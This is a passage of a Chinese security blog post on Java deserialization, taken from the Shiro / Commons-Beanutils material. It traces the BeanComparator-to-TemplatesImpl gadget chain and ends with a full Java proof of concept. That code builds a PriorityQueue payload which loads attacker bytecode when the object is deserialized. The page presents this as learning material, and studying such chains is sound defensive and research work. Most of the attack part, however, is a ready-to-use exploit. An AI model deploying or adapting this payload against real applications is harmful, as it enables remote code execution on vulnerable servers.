class="line"></span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var10) &#123;</span><br><span class="line">            valueString = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (values != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; values.length; ++i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        valueString = valueString + <span class="string">&quot;, &quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (values[i] == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        valueString = valueString + <span class="string">&quot;&lt;null&gt;&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        valueString = valueString + values[i].getClass().getName();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            expectedString = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            parTypes = method.getParameterTypes();</span><br><span class="line">            <span class="keyword">if</span> (parTypes != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; parTypes.length; ++i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        expectedString = expectedString + <span class="string">&quot;, &quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    expectedString = expectedString + parTypes[i].getName();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e = <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Cannot invoke &quot;</span> + method.getDeclaringClass().getName() + <span class="string">&quot;.&quot;</span> + method.getName() + <span class="string">&quot; on bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27; - &quot;</span> + var10.getMessage() + <span class="string">&quot; - had objects of type \&quot;&quot;</span> + valueString + <span class="string">&quot;\&quot; but expected signature \&quot;&quot;</span> + expectedString + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!BeanUtils.initCause(e, var10)) &#123;</span><br><span class="line">                <span class="keyword">this</span>.log.error(<span class="string">&quot;Method invocation failed&quot;</span>, var10);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220110214602005.png" alt="image-20220110214602005"></p>
+<p>那么我们找到一个与getter方法类似的方法，通过getProperty方法调用呢？在cc2中我们用到了类加载代码执行TemplatesImpl类，知道调用newTransformer方法就会加载我准备的恶意代码，在找什么地方调用newTransformer方法的时候在TemplatesImpl类下有一个getOutputProperties方法也调用了newTransformer方法，并且方法名与getter方法类似，我们尝试通过getProperty方法调用。</p>
+<p><img src="image-20220110215300925.png" alt="image-20220110215300925"></p>
+<p><img src="image-20220110215553067.png" alt="image-20220110215553067"></p>
+<p>事实证明是可以的，那我们就需要找调用链，找什么地方使用了getProperty方法。</p>
+<h4 id="BeanComparator-compare"><a href="#BeanComparator-compare" class="headerlink" title="BeanComparator.compare()"></a>BeanComparator.compare()</h4><p>在BeanComparator.compare方法中调用了getProperty方法，并且o1可控，property可通过反射赋值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String property;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object o1, Object o2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.property == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.comparator.compare(o1, o2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Object value1 = PropertyUtils.getProperty(o1, <span class="keyword">this</span>.property);</span><br><span class="line">                Object value2 = PropertyUtils.getProperty(o2, <span class="keyword">this</span>.property);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.comparator.compare(value1, value2);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;IllegalAccessException: &quot;</span> + var5.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;InvocationTargetException: &quot;</span> + var6.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;NoSuchMethodException: &quot;</span> + var7.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们new一个BeanComparator对象，通过反射修改property的值为outputProperties，当调用compare方法是传递templates对象就会调用getProperty方法，就会触发恶意代码，理想总是美好的，现实是残酷的。报错了。</p>
+<p><img src="image-20220110221133651.png" alt="image-20220110221133651"></p>
+<p>这里我们需要传递一个Comparator，如果不传的话他就会调用ComparableComparator.getInstance，他是commons collections的类，这里就会需要cc的依赖，我们需要找到一个类来替换，这个类需要实现 Comparator 和Serializable 接口，通过IDEA的功能，我们找到一个 ReverseComparator。</p>
+<p><img src="image-20220110221525797.png" alt="image-20220110221525797"></p>
+<p><img src="image-20220110222529047.png" alt="image-20220110222529047"></p>
+<p><img src="image-20220110222622497.png" alt="image-20220110222622497"></p>
+<p>通过Collections.reverseOrder()获取ReverseComparator对象，传递到BeanComparator构造方法中。</p>
+<p><img src="image-20220110223236681.png" alt="image-20220110223236681"></p>
+<p>到了这一步就要cc2相似了，就是PriorityQueue类，这里就不赘述了，直接看完整poc。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsBeanutilsSerialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;CB.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unSerialize</span><span class="params">(String FileName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(FileName));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException </span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] _bytecodes = &#123;code&#125;;</span><br><span class="line">        Class c = templates.getClass();</span><br><span class="line">        Field name = c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;ok&quot;</span>);</span><br><span class="line">        Field bytecodes = c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(templates, _bytecodes);</span><br><span class="line">        Field tfactory = c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>, Collections.reverseOrder());</span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,comparator);</span><br><span class="line">        priorityQueue.offer(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.offer(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class aClass = comparator.getClass();</span><br><span class="line">        Field property = aClass.getDeclaredField(<span class="string">&quot;property&quot;</span>);</span><br><span class="line">        property.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        property.set(comparator,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//为防止在offer的时候触发compare方法，我们就在添加完以后使用反射修改queue对象数组的值。</span></span><br><span class="line">        Class priorityQueueClass = priorityQueue.getClass();</span><br><span class="line">        Field queueField = priorityQueueClass.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        queueField.set(priorityQueue,<span class="keyword">new</span> Object[]&#123;templates,templates&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>序列化：</p>
+<p><img src="image-20220110224545987.png" alt="image-20220110224545987"></p>
+<p>反序列化：</p>
+<p><img src="image-20220110224833594.png" alt="image-20220110224833594"></p>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">标签</span><br/>
+                
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag">java安全</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2022/01/02/20220102-1/"
+                    data-tooltip="java反序列化Commons Collections(四)"
+                    aria-label="下一篇: java反序列化Commons Collections(四)"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/01/09/20220109/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/01/09/20220109/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/01/09/20220109/&amp;title=Shiro反序列化-550"
+                    title="分享到 QQ"
+                    aria-label="分享到 QQ"
+                >
+                    <i class="fab fa-qq" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2022 self_209. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2022/01/02/20220102-1/"
+                    data-tooltip="java反序列化Commons Collections(四)"
+                    aria-label="下一篇: java反序列化Commons Collections(四)"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/01/09/20220109/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/01/09/20220109/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/01/09/20220109/&amp;title=Shiro反序列化-550"
+                    title="分享到 QQ"
+                    aria-label="分享到 QQ"
+                >
+                    <i class="fab fa-qq" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/01/09/20220109/"
+                        aria-label="分享到 Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=https://self209.github.io/2022/01/09/20220109/"
+                        aria-label="分享到 Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/01/09/20220109/&amp;title=Shiro反序列化-550"
+                        aria-label="分享到 QQ"
+                    >
+                        <i class="fab fa-qq" aria-hidden="true"></i><span>分享到 QQ</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <h4 id="about-card-name">self_209</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+
+<script src="/assets/js/script-xim376viwh5lr12gw0yeibdthi5jv6dbtso7hirh0xa2nvwxpntwvib0dgwh.min.js"></script>
+
+<!--SCRIPTS END-->
+
+
+
+
+
+    </body>
+</html>
